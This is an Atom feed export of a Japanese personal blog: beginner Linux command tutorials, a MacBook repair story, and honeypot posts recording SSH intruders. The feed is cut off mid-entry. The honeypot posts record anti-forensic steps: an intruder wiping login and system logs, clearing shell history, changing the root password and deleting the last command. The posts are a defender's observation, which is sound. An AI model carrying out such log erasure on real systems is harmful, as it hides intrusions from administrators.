<h2 id="u9AD8_u6A5F_u80FD_u306Agrep"><a href="#u9AD8_u6A5F_u80FD_u306Agrep" class="headerlink" title="高機能なgrep"></a>高機能なgrep</h2><p>grepには大量にオプションがある。(詳細は <code>man grep</code> で確認！)</p>
<p>その中でも特に便利なオプションを紹介しておく。</p>
<ul>
<li><p><code>--color</code></p>
<p>検索文字列に色をつけて表示する。</p>
</li>
<li><p>-c</p>
<p>検索にマッチした行をカウントする。</p>
</li>
<li><p>-<i>number</i></p>
<p>検索にマッチした前後<i>number</i>行を表示する。</p>
</li>
<li><p>-A <i>number</i></p>
<p>検索にマッチした行から<i>number</i>行下を表示する。</p>
</li>
<li><p>-B <i>number</i></p>
<p>検索にマッチした行から<i>number</i>行上を表示する。</p>
</li>
<li><p>-e</p>
<p>パターンマッチを指定して検索ができる。</p>
<p>例: <code>sample1.txt</code>の中から<code>1</code>または<code>2</code>の文字を含む行を表示する。</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># grep -e <span class="number">1</span> -e <span class="number">2</span> sample1.txt</span></span><br><span class="line"><span class="number">01</span></span><br><span class="line"><span class="number">02</span></span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>-v</p>
<p>指定した文字列にマッチしない行を表示する。</p>
</li>
<li><p>-i</p>
<p>大文字小文字を区別しない。</p>
</li>
</ul>
<p>なお、<code>grep</code>はもっと機能があり、是非<code>man</code>でチェックしてもらいたい。<br>また、パイプでつげて、grepを複数書くこともできる(少しぶかっこうではあるが)。<br>まずは、目的のものを思い通りに表示できる手法を身につけ、そこからスマートなやり方を考えると時間はかかるかもしれないが着実にものにすることができるだろう。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>今回はファイルの中身を見たり検索したりしてみよう。</p>
<p>まず事前に中身のあるファイルを用意する。</p>
<p>全て見知らぬコマンドを利用しているが今回はこの説明は割愛する。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># seq -w <span class="number">1</span> <span class="number">10</span> &gt;sample1.txt</span></span><br><span class="line"><span class="preprocessor"># cat sample1.txt</span></span><br><span class="line"><span class="number">01</span></span><br><span class="line"><span class="number">02</span></span><br><span class="line"><span class="number">03</span></span><br><span class="line"><span class="number">04</span></span><br><span class="line"><span class="number">05</span></span><br><span class="line"><span class="number">06</span></span><br><span class="line"><span class="number">07</span></span><br><span class="line"><span class="number">08</span></span><br><span class="line"><span class="number">09</span></span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure>]]>
    
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[SSH不正侵入、観察日記 Vol.4]]></title>
    <link href="http://atani.github.io/2015/11/hacker-watch/"/>
    <id>http://atani.github.io/2015/11/hacker-watch/</id>
    <published>2015-11-05T15:52:27.000Z</published>
    <updated>2015-11-05T17:14:09.000Z</updated>
    <content type="html"><![CDATA[<p>しばらく寝かせておいたhoneypotのcowrieに久々アクセスしたところ、ログ消し魔が現れたのでご紹介。</p>
<a id="more"></a>
<img src="/2015/11/hacker-watch/cowrie_log.gif" alt="[cowrie_log.gif]" title="[cowrie_log.gif]">
<p>削除しようとしたのは、以下のファイル。削除した後しっかりファイルは作ってくれている。</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">var</span>/<span class="keyword">run</span>/utmp</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/wtmp</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/lastlog</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/messages</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/secure</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/xferlog</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/maillog</span><br></pre></td></tr></table></figure>
<p>その後、作業履歴を削除して去っていった。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>しばらく寝かせておいたhoneypotのcowrieに久々アクセスしたところ、ログ消し魔が現れたのでご紹介。</p>]]>
    
    </summary>
    
      <category term="cowrie" scheme="http://atani.github.io/tags/cowrie/"/>
    
      <category term="honeypot" scheme="http://atani.github.io/tags/honeypot/"/>
    
      <category term="security" scheme="http://atani.github.io/tags/security/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[現場で必須！超基本Linuxコマンド Vol.4]]></title>
    <link href="http://atani.github.io/2015/09/linux-command-4/"/>
    <id>http://atani.github.io/2015/09/linux-command-4/</id>
    <published>2015-09-10T10:04:07.000Z</published>
    <updated>2015-09-10T10:04:21.000Z</updated>
    <content type="html"><![CDATA[<p>前回、ファイルの操作や検索について紹介した。<br>今回は、目的のファイルを探したり、もう少し実践で使う処理について紹介する。</p>
<p>以下の構成を用いる。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">├── sample1<span class="class">.txt</span></span><br><span class="line">├── sample2<span class="class">.txt</span></span><br><span class="line">└── temp1</span><br><span class="line">    ├── depthfile1<span class="class">.txt</span></span><br><span class="line">    └── depthfile2.txt</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="find"><a href="#find" class="headerlink" title="find"></a>find</h1><p>ディレクトリやファイルを見つけるコマンド。</p>
<ul>
<li><p>例: <code>depthfile1.txt</code> というファイルを探したい。</p>
 <figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">find</span> . -name <span class="string">"depthfile1.txt"</span></span><br><span class="line">.<span class="regexp">/temp1/</span>depthfile1.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>例: ファイルの一覧を出したい</p>
 <figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># <span class="built_in">find</span> . -<span class="built_in">type</span> f</span><br><span class="line">./sample1.txt</span><br><span class="line">./sample2.txt</span><br><span class="line">./temp1/depthfile1.txt</span><br><span class="line">./temp1/depthfile2.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>例: ディレクトリの一覧を出したい</p>
 <figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># <span class="built_in">find</span> . -<span class="built_in">type</span> d</span><br><span class="line">.</span><br><span class="line">./temp1</span><br></pre></td></tr></table></figure>
</li>
<li><p>例: ファイルの一覧を出したい。ただし、<code>sample1.txt</code> という文字が入っているファイルは除外する</p>
 <figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># find . ! -name <span class="string">"sample1.txt"</span> -a -<span class="typedef"><span class="keyword">type</span> f</span></span><br><span class="line">./sample2.txt</span><br><span class="line">./temp1/depthfile1.txt</span><br><span class="line">./temp1/depthfile2.txt</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h1><p>標準入力を読み込み、引数にして指定したコマンドを実行することができる。</p>
<p>例えば、最初に表示した構成で、ファイルを全て消したい場合、一つ一つ<code>rm</code> <i>filename</i> を渡して消せば消えるが、４回実行する必要があるが、findとxargsを組み合わせると１回でファイルを削除することができる。</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">まずは確認</span><br><span class="line"># <span class="built_in">find</span> . -<span class="built_in">type</span> f</span><br><span class="line">./sample1.txt</span><br><span class="line">./sample2.txt</span><br><span class="line">./temp1/depthfile1.txt</span><br><span class="line">./temp1/depthfile2.txt</span><br><span class="line"></span><br><span class="line">実行</span><br><span class="line"># <span class="built_in">find</span> . -<span class="built_in">type</span> f | xargs rm</span><br><span class="line"></span><br><span class="line">消えていることを確認</span><br><span class="line"># <span class="built_in">find</span> . -<span class="built_in">type</span> f</span><br></pre></td></tr></table></figure>
<p>このように組み合わせることで出来ることが増える。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>前回、ファイルの操作や検索について紹介した。<br>今回は、目的のファイルを探したり、もう少し実践で使う処理について紹介する。</p>
<p>以下の構成を用いる。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">├── sample1<span class="class">.txt</span></span><br><span class="line">├── sample2<span class="class">.txt</span></span><br><span class="line">└── temp1</span><br><span class="line">    ├── depthfile1<span class="class">.txt</span></span><br><span class="line">    └── depthfile2.txt</span><br></pre></td></tr></table></figure>]]>
    
    </summary>
    
      <category term="linux" scheme="http://atani.github.io/tags/linux/"/>
    
      <category term="tutorial" scheme="http://atani.github.io/tags/tutorial/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[現場で必須！超基本Linuxコマンド Vol.2]]></title>
    <link href="http://atani.github.io/2015/09/linux-command-2/"/>
    <id>http://atani.github.io/2015/09/linux-command-2/</id>
    <published>2015-09-07T13:16:16.000Z</published>
    <updated>2015-09-07T13:16:16.000Z</updated>
    <content type="html"><![CDATA[<p>前回、<a href="http://atani.github.io/2015/09/linux-command">現場で必須！超基本Linuxコマンド Vol.1</a>の続き。<br>今回は、ファイルやディレクトリの操作をしてみよう。</p>
<a id="more"></a>
<p>前回、<a href="http://atani.github.io/2015/09/linux-command">現場で必須！超基本Linuxコマンド Vol.1</a>の続き。<br>今回は、ファイルやディレクトリの操作と確認をしてみよう。</p>
<p>現場では変更が行われる処理の前後には必ず状態を確認する。なぜならば、思った通りに動作しているかを確認するためだ。これは必ず必要な作業なので押さえておこう。</p>
<!-- more -->
<h1 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h1><p>「list segmentation」の略<br>ファイルやディレクトリの一覧を表示する。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># <span class="tag">ls</span></span><br><span class="line"><span class="tag">sample1</span><span class="class">.txt</span> <span class="tag">sample2</span><span class="class">.txt</span> <span class="tag">sample3</span><span class="class">.txt</span> <span class="tag">sample4</span><span class="class">.txt</span> <span class="tag">sample5</span><span class="class">.txt</span> <span class="tag">temp1</span>       <span class="tag">temp2</span></span><br></pre></td></tr></table></figure>
<p>ほとんどのコマンドには、オプションがあり、オプションを設定することで、こまやかな処理を実行する事ができるようになる。</p>
<p>例えば、<code>ls</code>単体で実行すると先ほど結果を書いた通り、ファイルやディレクトリの一覧を出してくれる。今度は<code>-l</code>オプションを渡して、みる。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># ls -l</span></span><br><span class="line">total <span class="number">0</span></span><br><span class="line">-rw-r--r--  <span class="number">1</span> atani  staff    <span class="number">0</span>  <span class="number">9</span>  <span class="number">3</span> <span class="number">21</span>:<span class="number">47</span> sample1.txt</span><br><span class="line">-rw-r--r--  <span class="number">1</span> atani  staff    <span class="number">0</span>  <span class="number">9</span>  <span class="number">3</span> <span class="number">21</span>:<span class="number">47</span> sample2.txt</span><br><span class="line">-rw-r--r--  <span class="number">1</span> atani  staff    <span class="number">0</span>  <span class="number">9</span>  <span class="number">3</span> <span class="number">21</span>:<span class="number">47</span> sample3.txt</span><br><span class="line">-rw-r--r--  <span class="number">1</span> atani  staff    <span class="number">0</span>  <span class="number">9</span>  <span class="number">3</span> <span class="number">21</span>:<span class="number">47</span> sample4.txt</span><br><span class="line">-rw-r--r--  <span class="number">1</span> atani  staff    <span class="number">0</span>  <span class="number">9</span>  <span class="number">3</span> <span class="number">21</span>:<span class="number">47</span> sample5.txt</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> atani  staff   <span class="number">68</span>  <span class="number">9</span>  <span class="number">5</span> <span class="number">16</span>:<span class="number">24</span> temp1</span><br><span class="line">drwxr-xr-x  <span class="number">7</span> atani  staff  <span class="number">238</span>  <span class="number">9</span>  <span class="number">5</span> <span class="number">16</span>:<span class="number">24</span> temp2</span><br></pre></td></tr></table></figure>
<p>すると、ファイルやディレクトリのより詳細な情報を表示してくれるようになった。<br>今度は、<code>-t</code>オプションを付け加えてみよう。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># ls -l -t</span></span><br><span class="line">total <span class="number">0</span></span><br><span class="line">drwxr-xr-x  <span class="number">7</span> atani  staff  <span class="number">238</span>  <span class="number">9</span>  <span class="number">5</span> <span class="number">16</span>:<span class="number">24</span> temp2</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> atani  staff   <span class="number">68</span>  <span class="number">9</span>  <span class="number">5</span> <span class="number">16</span>:<span class="number">24</span> temp1</span><br><span class="line">-rw-r--r--  <span class="number">1</span> atani  staff    <span class="number">0</span>  <span class="number">9</span>  <span class="number">3</span> <span class="number">21</span>:<span class="number">47</span> sample1.txt</span><br><span class="line">-rw-r--r--  <span class="number">1</span> atani  staff    <span class="number">0</span>  <span class="number">9</span>  <span class="number">3</span> <span class="number">21</span>:<span class="number">47</span> sample2.txt</span><br><span class="line">-rw-r--r--  <span class="number">1</span> atani  staff    <span class="number">0</span>  <span class="number">9</span>  <span class="number">3</span> <span class="number">21</span>:<span class="number">47</span> sample3.txt</span><br><span class="line">-rw-r--r--  <span class="number">1</span> atani  staff    <span class="number">0</span>  <span class="number">9</span>  <span class="number">3</span> <span class="number">21</span>:<span class="number">47</span> sample4.txt</span><br><span class="line">-rw-r--r--  <span class="number">1</span> atani  staff    <span class="number">0</span>  <span class="number">9</span>  <span class="number">3</span> <span class="number">21</span>:<span class="number">47</span> sample5.txt</span><br></pre></td></tr></table></figure>
<p><code>-t</code> オプションはリストをタイムスタンプ順が最新のもの順に並び替えてくれる。また、オプションは複数渡すことが可能である。さらに、オプションは同時に記述することも可能である場合がある。<br>上記の<code>ls -l -t</code> は <code>ls -lt</code> と同等である。</p>
<h2 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a>mkdir</h2><p>「make directory」の略で、ディレクトリを作成する。</p>
<p>例:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># mkdir temp3</span></span><br><span class="line"><span class="preprocessor"># ls -ld temp3/</span></span><br><span class="line">drwxr-xr-x  <span class="number">2</span> atani  staff  <span class="number">68</span>  <span class="number">9</span>  <span class="number">7</span> <span class="number">20</span>:<span class="number">56</span> temp3/</span><br></pre></td></tr></table></figure>
<h2 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h2><p>「move」の略でファイルやディレクトリの移動または名前を変更する。</p>
<p>例:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># mv temp3 temp4</span></span><br><span class="line"><span class="preprocessor"># ls -ld temp4</span></span><br><span class="line">drwxr-xr-x  <span class="number">2</span> atani  staff  <span class="number">68</span>  <span class="number">9</span>  <span class="number">7</span> <span class="number">20</span>:<span class="number">56</span> temp4</span><br></pre></td></tr></table></figure>
<h2 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h2><p>「copy」の略でファイルやディレクトリをコピーする。</p>
<p>例:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># cp sample6.txt sample7.txt</span></span><br><span class="line"><span class="preprocessor"># ls -l sample6.txt sample7.txt</span></span><br><span class="line">-rw-r--r--  <span class="number">1</span> atani  staff  <span class="number">0</span>  <span class="number">9</span>  <span class="number">3</span> <span class="number">21</span>:<span class="number">47</span> sample6.txt</span><br><span class="line">-rw-r--r--  <span class="number">1</span> atani  staff  <span class="number">0</span>  <span class="number">9</span>  <span class="number">7</span> <span class="number">20</span>:<span class="number">58</span> sample7.txt</span><br></pre></td></tr></table></figure>
<h2 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h2><p>「remove」の略でファイルやディレクトリを削除する。</p>
<p>例:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># rm sample7.txt</span></span><br><span class="line"><span class="preprocessor"># ls -l sample6.txt sample7.txt</span></span><br><span class="line">ls: sample7.txt: No such file or directory</span><br><span class="line">-rw-r--r--  <span class="number">1</span> atani  staff  <span class="number">0</span>  <span class="number">9</span>  <span class="number">3</span> <span class="number">21</span>:<span class="number">47</span> sample6.txt</span><br></pre></td></tr></table></figure>
<h2 id="man"><a href="#man" class="headerlink" title="man"></a>man</h2><p>ここまで足早に見てきたが、それぞれのコマンドにはもちろんオプションが用意されている。しかし、どのオプションが使えるの？と迷ったときに使うのが<code>man</code>コマンドだ。</p>
<p><code>man ls</code> と実行すれば、<code>ls</code> コマンドの説明ページが出てくる。</p>
<p>読み終わったら <code>q</code> で終了することができる。</p>
<p>最後に総集編の動画をどうぞ。</p>
<img src="/2015/09/linux-command-2/command.gif" alt="[command.gif]" title="[command.gif]">
]]></content>
    <summary type="html">
    <![CDATA[<p>前回、<a href="http://atani.github.io/2015/09/linux-command">現場で必須！超基本Linuxコマンド Vol.1</a>の続き。<br>今回は、ファイルやディレクトリの操作をしてみよう。</p>]]>
    
    </summary>
    
      <category term="linux" scheme="http://atani.github.io/tags/linux/"/>
    
      <category term="tutorial" scheme="http://atani.github.io/tags/tutorial/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[現場で必須！超基本Linuxコマンド Vol.1]]></title>
    <link href="http://atani.github.io/2015/09/linux-command/"/>
    <id>http://atani.github.io/2015/09/linux-command/</id>
    <published>2015-09-05T11:18:29.000Z</published>
    <updated>2015-09-06T00:40:31.000Z</updated>
    <content type="html"><![CDATA[<p>社内でたびたびLinuxを学びたいという志高い人についてLinuxコマンド勉強会を開催しているが、<br>いつも大学の授業形式でホワイトボードに説明を書いては消し、書いては消しの繰り返しなので、ブログに残しておく。</p>
<p>普段使われている、マウスでぽちぽちするGUI環境と違い、CUI環境はコマンドやスクリプトを全てキーボードで文字を入力して実行する。</p>
<p>コマンドをたくさん覚えると一つの画面でいろんなことができる。<br>ファイルを開いたり、特定の名前だけのファイルを削除したり、PCシャットダウンしたり。<br>はたまた、これまでやってた一連の作業をスクリプト化して実行すれば、これまで１時間かけてやってた処理は3分で終わるかもしれない。できることは無限大。</p>
<p>そのためにはまず少しづつコマンドを覚え、それぞれが出来ること覚える必要がある。</p>
<p>そこで、基本中の基本のコマンドを中心にご紹介していく。どんな優秀なエンジニアでも使うことが多いコマンドたちなので安心して覚えてもらいたい。</p>
<a id="more"></a>
<p>コマンドを習う前にいくつかの用語と階層構造を理解する必要がある。</p>
<h2 id="u30AB_u30EC_u30F3_u30C8_u30C7_u30A3_u30EC_u30AF_u30C8_u30EA"><a href="#u30AB_u30EC_u30F3_u30C8_u30C7_u30A3_u30EC_u30AF_u30C8_u30EA" class="headerlink" title="カレントディレクトリ"></a>カレントディレクトリ</h2><p>ユーザが現在作業を行っているディレクトリの事 . 「ドット」で表す。</p>
<h2 id="u89AA_u30C7_u30A3_u30EC_u30AF_u30C8_u30EA"><a href="#u89AA_u30C7_u30A3_u30EC_u30AF_u30C8_u30EA" class="headerlink" title="親ディレクトリ"></a>親ディレクトリ</h2><p>ディレクトリの１階層上のディレクトリの事。 .. 「ドットドット」で表す。</p>
<h2 id="u7D76_u5BFE_u30D1_u30B9"><a href="#u7D76_u5BFE_u30D1_u30B9" class="headerlink" title="絶対パス"></a>絶対パス</h2><p>階層構造の頂点から、目的のフォルダやファイルまでを省略なしに記述したもの</p>
<h2 id="u76F8_u5BFE_u30D1_u30B9"><a href="#u76F8_u5BFE_u30D1_u30B9" class="headerlink" title="相対パス"></a>相対パス</h2><p>カレントディレクトリから目的のフォルダやファイルまでを記述したもの</p>
<h3 id="u4F8B"><a href="#u4F8B" class="headerlink" title="例"></a>例</h3><p><code>temp2</code> をカレントディレクトリとすると…<br>親ディレクトリは、 <code>temp</code><br><code>sample6.txt</code>までを相対パスで書くと <code>./sample6.txt</code><br><code>sample6.txt</code>までを絶対パスで書くと <code>/temp/temp2/sample6.txt</code></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/temp/</span><br><span class="line">├── sample1<span class="class">.txt</span></span><br><span class="line">├── sample2<span class="class">.txt</span></span><br><span class="line">├── sample3<span class="class">.txt</span></span><br><span class="line">├── sample4<span class="class">.txt</span></span><br><span class="line">├── sample5<span class="class">.txt</span></span><br><span class="line">├── temp1</span><br><span class="line">└── temp2             &lt;- カレントディレクトリ</span><br><span class="line">    ├── sample6<span class="class">.txt</span></span><br><span class="line">    ├── sample7<span class="class">.txt</span></span><br><span class="line">    ├── sample8<span class="class">.txt</span></span><br><span class="line">    ├── sample9<span class="class">.txt</span></span><br><span class="line">    └── sample10.txt</span><br></pre></td></tr></table></figure>
<h1 id="u57FA_u672C_u30B3_u30DE_u30F3_u30C9"><a href="#u57FA_u672C_u30B3_u30DE_u30F3_u30C9" class="headerlink" title="基本コマンド"></a>基本コマンド</h1><p>今回はカレントディレクトリの変更と、現在のカレントディレクトリを表示するコマンドをご紹介。</p>
<h2 id="cd"><a href="#cd" class="headerlink" title="cd"></a>cd</h2><p>「Change Directory」の略で、カレントディレクトリを変更する。</p>
<h2 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h2><p>「Print Working Directory」の略で、カレントディレクトリの絶対パスを表示する。</p>
<p>上記、二つを組み合わせて、移動して、カレントディレクトリの確認をしてみよう。</p>
<h3 id="u52D5_u753B"><a href="#u52D5_u753B" class="headerlink" title="動画"></a>動画</h3><img src="/2015/09/linux-command/cd.gif" alt="[cd.gif]" title="[cd.gif]">
]]></content>
    <summary type="html">
    <![CDATA[<p>社内でたびたびLinuxを学びたいという志高い人についてLinuxコマンド勉強会を開催しているが、<br>いつも大学の授業形式でホワイトボードに説明を書いては消し、書いては消しの繰り返しなので、ブログに残しておく。</p>
<p>普段使われている、マウスでぽちぽちするGUI環境と違い、CUI環境はコマンドやスクリプトを全てキーボードで文字を入力して実行する。</p>
<p>コマンドをたくさん覚えると一つの画面でいろんなことができる。<br>ファイルを開いたり、特定の名前だけのファイルを削除したり、PCシャットダウンしたり。<br>はたまた、これまでやってた一連の作業をスクリプト化して実行すれば、これまで１時間かけてやってた処理は3分で終わるかもしれない。できることは無限大。</p>
<p>そのためにはまず少しづつコマンドを覚え、それぞれが出来ること覚える必要がある。</p>
<p>そこで、基本中の基本のコマンドを中心にご紹介していく。どんな優秀なエンジニアでも使うことが多いコマンドたちなので安心して覚えてもらいたい。</p>]]>
    
    </summary>
    
      <category term="linux" scheme="http://atani.github.io/tags/linux/"/>
    
      <category term="tutorial" scheme="http://atani.github.io/tags/tutorial/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[保証期間外のMacbookAir、１２万円の修理が無償で返ってきた！]]></title>
    <link href="http://atani.github.io/2015/08/MacbookAir-repair/"/>
    <id>http://atani.github.io/2015/08/MacbookAir-repair/</id>
    <published>2015-08-19T22:14:20.000Z</published>
    <updated>2015-08-19T22:19:33.000Z</updated>
    <content type="html"><![CDATA[<p>不調だった、MacbookAirが修理から戻ってきた。<br>保証期間も過ぎていたので、有償での修理を覚悟していたが１２万円かかった修理がなんと<b>無償</b>で返って来たのでその記録。</p>
<a id="more"></a>
<p>2012年に購入した、MacbooAirが数ヶ月前から以下のような症状が出るようになった。</p>
<ul>
<li>Safariが「safariが予期しない理由で終了しました。」</li>
<li>「問題が起きたためコンピュータを再起動しました。このまま起動する場合は、いずれかのキーを押すか、数秒間そのままお待ちください。」となり、macbook自体が強制再起動をする。</li>
</ul>
<p>上記症状は、はじめは時々起こっていたが、頻度が多くなってきた。<br>クリーンインストールするも状況は変わらなかったので、何が原因かを調査するため、「Apple Hardware Test」を実施することに。<br>※ 2013年6月以降に発売されているmacbookの場合は、Apple Diagnostics。</p>
<p>作業手順は、以下の通り。</p>
<ol>
<li>一度、システム終了します。</li>
<li>電源ボタンを押して、起動する。</li>
<li>グレイの起動画面が表示される前に「D」キーを押したままにします。</li>
<li>選択画面が出てきたら、言語を選択する。</li>
<li>AHTコンソールが表示されるのでテストを選択して実行。<br>※ 今回は、「全テストを実行します(Perform extended testing）にチェックを入れてテストを行った。</li>
</ol>
<p>すると、以下のエラーが出た。</p>
<img src="/2015/08/MacbookAir-repair/mac.jpg" alt="[mac.jpg]" title="[mac.jpg]">
<p>何度か実行しても同じエラーが出るため、Apple直営店へ。<br>しかし、Genius Barは既に１週間先まで予約がいっぱい。<br>※ 毎日0時７日後の予約が取れるという情報を店員さんに頂くも待っていられなかったので、「Apple製品修理 正規サービスプロバイダ」のビックカメラさんへ。</p>
<p>昼間はiphone修理の人が常時10名以上待っている状態で、１時間待ちは当たり前なので、開店と同時に受付を済ませた。<br>macbook担当の方は別にいて12時に来るとのこと。<br>12時に修理依頼を済ませ、しばしmacbookとお別れ。</p>
<p>1週間後、連絡があり基盤に不具合があり、特別保証により、ロジックボードを無償で交換しました。とのこと！</p>
<img src="/2015/08/MacbookAir-repair/mac2.jpg" alt="[mac2.jpg]" title="[mac2.jpg]">
<p>MacbookAirは無事に修理から戻ってきた。</p>
<p>後で気づいたが、<b>修理代１２万円</b>だった。</p>
<img src="/2015/08/MacbookAir-repair/mac3.jpg" alt="[mac3.jpg]" title="[mac3.jpg]">
]]></content>
    <summary type="html">
    <![CDATA[<p>不調だった、MacbookAirが修理から戻ってきた。<br>保証期間も過ぎていたので、有償での修理を覚悟していたが１２万円かかった修理がなんと<b>無償</b>で返って来たのでその記録。</p>]]>
    
    </summary>
    
      <category term="macbookair" scheme="http://atani.github.io/tags/macbookair/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[SSH不正侵入、観察日記 Vol.3]]></title>
    <link href="http://atani.github.io/2015/08/SSH%E4%B8%8D%E6%AD%A3%E4%BE%B5%E5%85%A5%E3%80%81%E8%A6%B3%E5%AF%9F%E6%97%A5%E8%A8%98-Vol-3/"/>
    <id>http://atani.github.io/2015/08/SSH不正侵入、観察日記-Vol-3/</id>
    <published>2015-08-10T09:48:37.000Z</published>
    <updated>2015-08-10T09:48:37.000Z</updated>
    <content type="html"><![CDATA[<p>スペインから不正アクセスを記録した。</p>
<p>まずは、いつも通り動画をご覧いただこう。</p>
<a id="more"></a>
<img src="/2015/08/SSH不正侵入、観察日記-Vol-3/cowrie_log.gif" alt="[cowrie_log.gif]" title="[cowrie_log.gif]">
<p><code>root</code>ユーザーでログインし、パスワードを変更。<br>その後、<code>/usr/bin/last*</code>を削除して逃げた。</p>
<p>何を削除しているのかチェック。するとログイン履歴を見るコマンドを削除しているようだ。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l /usr/bin/last*</span><br><span class="line">-rwxr-xr-x. <span class="number">1</span> root root <span class="number">19568</span>  <span class="number">6</span>月 <span class="number">10</span>  <span class="number">2014</span> /usr/bin/last</span><br><span class="line">lrwxrwxrwx. <span class="number">1</span> root root     <span class="number">4</span>  <span class="number">7</span>月 <span class="number">31</span> <span class="number">19</span>:<span class="number">58</span> /usr/bin/lastb -&gt; last</span><br><span class="line">-rwxr-xr-x. <span class="number">1</span> root root <span class="number">15392</span>  <span class="number">3</span>月  <span class="number">6</span> <span class="number">14</span>:<span 